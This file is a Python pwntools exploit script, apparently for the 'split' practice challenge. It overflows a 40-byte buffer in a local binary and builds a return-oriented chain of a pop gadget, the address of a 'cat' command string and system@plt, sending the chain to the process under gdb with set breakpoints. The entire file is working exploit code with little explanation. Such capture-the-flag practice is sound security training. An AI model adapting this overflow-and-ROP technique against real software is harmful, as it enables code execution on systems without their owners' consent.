from pwn import *

context(arch = 'i686', os = 'linux')

useFulFunction = 0x400807
ret =       0x4005b9
popret =    0x4006b0
leaveret =  0x400805
addesp_8 =  0x4005b6
system_plt =0x4005e0
callq = 0x400810
cat = 0x601060
buffSize = 40
pattern = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnC'
# pwn
dirname = os.path.dirname(os.path.abspath(__file__))
proc = process(dirname+'/split')

#context.terminal = ["bash", "-e"]
context.terminal = ['tmux', 'splitw', '-h']

# デバッガーにアタッチする
#"""
gdb.attach(proc, '''
    set follow-fork-mode child
    b *0x4006b0
    b *0x400807
    b *0x400810
    b *0x0000000000400883
    continue
''')
#"""

payload = b'A' * buffSize
payload += p64(0x0000000000400883)
payload += p64(cat)
payload += p64(system_plt)
#mov     eax, 1
#mov     ebx, 0
#int     0x80
    #p8(0x90) * 40 + \
    #p64(0x4005e0) + \
    #p8(0x00)
print(payload)
print(len(payload))

proc.sendlineafter(">",payload)

try:
    print(proc.recvline())
except EOFError:
     print('EOFError')
proc.wait_for_close()
print(proc.poll())  
